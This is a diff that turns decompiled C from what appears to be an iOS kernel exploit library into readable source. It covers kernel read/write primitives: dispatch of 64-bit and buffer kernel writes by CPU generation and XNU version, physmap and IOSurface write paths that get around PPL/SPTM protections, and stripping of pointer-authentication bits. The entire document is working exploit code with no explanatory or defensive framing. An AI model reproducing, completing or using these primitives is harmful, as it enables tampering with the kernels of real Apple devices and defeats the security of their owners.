@@ -1,55 +1,41 @@
 //----- (0000000000028CE0) ----------------------------------------------------
 unsigned __int64 __fastcall find_sptm_pgtable_state_block(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3)
 {
-  int v5; // w0
   struct
   {
-    __int128 v7[2];
-    __int64 v8;
-  } out; // [xsp+0h] [xbp-50h] BYREF
+    uint8_t unused[32];
+    uint64_t paddr;
+  } walk = {0};
 
-  memset(&out, 0, sizeof(out));
-  v5 = pgtable_walk_full(krwCtx, a2, (__int64)&out, a3).n128_u64[0];
-  if ( v5 )
-    return (krwCtx->pageMask & a2) | (out.v8 & 0xFFFFFFFFC000LL);
-  else
+  if ( !pgtable_walk_full(krwCtx, a2, (__int64)&walk, a3).n128_u64[0] )
     return 0;
+  return (krwCtx->pageMask & a2) | (walk.paddr & 0xFFFFFFFFC000LL);
 }
 
 //----- (0000000000028D44) ----------------------------------------------------
-__int64 __fastcall teardown_sptm_pgtable_state(__int64 a1)
+__int64 __fastcall teardown_sptm_pgtable_state(struct_krwCtx *krwCtx)
 {
-  __int64 v1; // x21
-  uint64_t *v2; // x19
-  vm_address_t v4; // x1
-  vm_size_t v5; // x2
+  uint64_t *state = (uint64_t *)krwCtx->IOKitConnInfo;
+  if ( !state )
+    return 708609;
 
-  v1 = 708609;
-  v2 = *(uint64_t **)(a1 + 7496);
-  if ( v2 )
+  if ( state[2] && state[3] )
   {
-    v4 = v2[2];
-    if ( !v4
-      || (v5 = v2[3]) == 0
-      || (vm_deallocate(mach_task_self_, v4, v5), v2[2] = 0, v2[3] = 0, (v2 = *(uint64_t **)(a1 + 7496)) != 0) )
-    {
-      *(uint64_t *)(a1 + 7496) = 0;
-      *((uint8_t *)v2 + 72) = 1;
-      __ulock_wake(0x201u, (void *)((char *)v2 + 52), *((unsigned int *)v2 + 12));
-      pthread_join((pthread_t)v2[5], 0);
-      *(__int128 *)v2 = 0u;
-      *((__int128 *)v2 + 1) = 0u;
-      *((__int128 *)v2 + 2) = 0u;
-      *((__int128 *)v2 + 3) = 0u;
-      *((__int128 *)v2 + 4) = 0u;
-      *((__int128 *)v2 + 5) = 0u;
-      *((__int128 *)v2 + 6) = 0u;
-      v2[14] = 0;
-      free(v2);
-      return 0;
-    }
+    vm_deallocate(mach_task_self_, state[2], state[3]);
+    state[2] = 0;
+    state[3] = 0;
+    state = (uint64_t *)krwCtx->IOKitConnInfo;
+    if ( !state )
+      return 708609;
   }
-  return v1;
+
+  krwCtx->IOKitConnInfo = 0;
+  *((uint8_t *)state + 72) = 1;
+  __ulock_wake(0x201u, (void *)((char *)state + 52), *((uint32_t *)state + 12));
+  pthread_join((pthread_t)state[5], 0);
+  memset(state, 0, 0x78u);
+  free(state);
+  return 0;
 }
 
 //----- (0000000000028DFC) ----------------------------------------------------
@@ -728,39 +714,32 @@ bool __fastcall kread64_internal(struct_krwCtx *krwCtx, unsigned __int64 a2, uin
 //----- (0000000000029CB0) ----------------------------------------------------
 unsigned __int64 __fastcall maybe_sptm_translate_kaddr(struct_krwCtx *krwCtx, __int64 a2)
 {
-
   if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) || (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 )
     return a2;
   return krw_xpac_vaddr(krwCtx, a2);
 }
-// 29D08: variable 'vars8' is possibly undefined
 
 //----- (0000000000029D2C) ----------------------------------------------------
 unsigned __int64 __fastcall krw_xpac_vaddr_if_needed(struct_krwCtx *krwCtx, __int64 a2)
 {
-
   if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
     return a2;
   return krw_xpac_vaddr(krwCtx, a2);
 }
-// 29D68: variable 'vars8' is possibly undefined
 
 //----- (0000000000029D88) ----------------------------------------------------
 unsigned __int64 __fastcall krw_xpac_vaddr(struct_krwCtx *krwCtx, __int64 a2)
 {
-  __int64 v2; // x19
-
-  v2 = a2;
-  if ( a2 && (a2 & 0x80000000000000LL) != 0 )
+  uint64_t vaddr = a2;
+  if ( vaddr && (vaddr & 0x80000000000000LL) != 0 )
   {
     if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER)
       || (krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16_A17_MASK)
        && krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8792, 40, 108, 0, 0)) )
-      return v2 | 0xFFFF800000000000LL;
-    else
-      return v2 | 0xFFFFFF8000000000LL;
+      return vaddr | 0xFFFF800000000000LL;
+    return vaddr | 0xFFFFFF8000000000LL;
   }
-  return v2;
+  return vaddr;
 }
 
 //----- (0000000000029DF8) ----------------------------------------------------
@@ -906,30 +885,23 @@ __int64 __fastcall kwritebuf_last_arg_1(struct_krwCtx *krwCtx, __int64 address, 
 //----- (000000000002A190) ----------------------------------------------------
 unsigned __int64 __fastcall port_right_index_to_kaddr(struct_krwCtx *krwCtx, unsigned int a2)
 {
-  __int64 v2; // x19
-  unsigned __int64 result; // x0
-  __int64 v4; // x8
-  __int64 v5; // x9
-  int v6; // [xsp+Ch] [xbp-14h] BYREF
-
-  v2 = a2;
   if ( !a2 )
     return 0;
+
   if ( (a2 & 0x80000000) != 0 )
   {
-    v4 = krwCtx->gap_0x1F0;
-    if ( v4 )
-    {
-      v5 = krwCtx->gap_0x1F8;
-      if ( (uint32_t)v5 )
-        return v4 + (a2 & 0x7FFFFFFF) * v5;
-    }
+    uint64_t tableBase = krwCtx->gap_0x1F0;
+    uint64_t stride = krwCtx->gap_0x1F8;
+    if ( tableBase && (uint32_t)stride )
+      return tableBase + (a2 & 0x7FFFFFFF) * stride;
     return 0;
   }
-  result = kernel_va_base_resolver(krwCtx, 0, &v6);
-  if ( result )
-    result += v2 << v6;
-  return result;
+
+  int shift = 0;
+  uint64_t base = kernel_va_base_resolver(krwCtx, 0, &shift);
+  if ( base )
+    base += (uint64_t)a2 << shift;
+  return base;
 }
 
 //----- (000000000002A200) ----------------------------------------------------
@@ -1108,10 +1080,8 @@ bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, cons
   {
     rawStatus = customKwrite(krwCtx, a2, a3, a4, a5);
     TRACE_PORTS("noppl_kwritebuf backend=custom raw=%x\n", rawStatus);
-    goto done;
   }
-
-  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
+  else if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
   {
     rawStatus = iosurface_physmap_kwrite(krwCtx, a2, (__int64)a3, a4, a5);
     TRACE_PORTS("noppl_kwritebuf backend=sptm raw=%x\n", rawStatus);
@@ -1144,7 +1114,6 @@ bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, cons
     return rawStatus == 0;
   }
 
-done:
   TRACE_PORTS("noppl_kwritebuf exit raw=%x ok=%d\n", rawStatus, rawStatus == 0);
   return rawStatus == 0;
 }
@@ -1174,35 +1143,19 @@ mach_vm_address_t __fastcall ppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address
 //----- (000000000002A63C) ----------------------------------------------------
 int kwrite64_dispatch(struct_krwCtx *krwCtx, mach_vm_address_t address, __int64 new_value)
 {
-    // Version threshold: XNU_VERSION_PACKED(8019, 60, 40, 0, 0)
-    // = 0x001F530F02800000
-    if (krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0)) {
+  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
+  {
+    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
+      return ppl_kwrite_physmap_checked(krwCtx, address, new_value);
 
-        // New path: check for specific CPU/capability flag 0x05184001
-        if (krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK)) {
-            // Tail call — PAC-authenticated branch to ppl_kwrite_physmap_checked
-            return ppl_kwrite_physmap_checked(krwCtx, address, new_value);
-        }
+    uint64_t remappedAddress = remap_kaddr_through_physmap(krwCtx, address);
+    if ( !remappedAddress )
+      return 0;
+    address = remappedAddress;
+  }
 
-        // Translate address via remap_kaddr_through_physmap
-        uint64_t translated = remap_kaddr_through_physmap(krwCtx, address);
-        if (!translated)
-            return 0;  // retab with no value set → returns 0
-
-        // Use translated address, fall through to kwrite64_last_arg
-        address = translated;
-        // fall through
-
-    }
-
-    // Old path (and new path fallthrough):
-    // ldrb w3, [x20, #0xc]  →  4th arg = krwCtx->byte_0x0c
-    uint8_t arg3 = krwCtx->gap_0xC;
-
-    // Tail call
-    return kwrite64_last_arg(krwCtx, address, new_value, arg3);
+  return kwrite64_last_arg(krwCtx, address, new_value, krwCtx->gap_0xC);
 }
-// 2A6A4: variable 'vars8' is possibly undefined
 
 //----- (000000000002A714) ----------------------------------------------------
 unsigned __int64 __fastcall kwritebuf_universal(
@@ -1211,25 +1164,18 @@ unsigned __int64 __fastcall kwritebuf_universal(
         const void *newBytes,
         mach_vm_size_t length)
 {
-  unsigned __int64 vaddr_; // x22
-  struct_krwCtx *krwCtx_; // x21
-  unsigned __int64 result; // x0
-
-  vaddr_ = vaddr;
   if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
   {
     if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
-    {
-      return ppl_kwritebuf(krwCtx, vaddr_, (void *)newBytes, length);
-    }
-    result = remap_kaddr_through_physmap(krwCtx, vaddr_);
-    if ( !result )
-      return result;
-    vaddr = result;
+      return ppl_kwritebuf(krwCtx, vaddr, (void *)newBytes, length);
+
+    uint64_t remappedAddress = remap_kaddr_through_physmap(krwCtx, vaddr);
+    if ( !remappedAddress )
+      return 0;
+    vaddr = remappedAddress;
   }
   return noppl_kwritebuf(krwCtx, vaddr, newBytes, length, 1);
 }
-// 2A784: variable 'vars8' is possibly undefined
 
 //----- (000000000002A7F4) ----------------------------------------------------
 __int64 __fastcall mach_vm_read_with_attr_chunks(
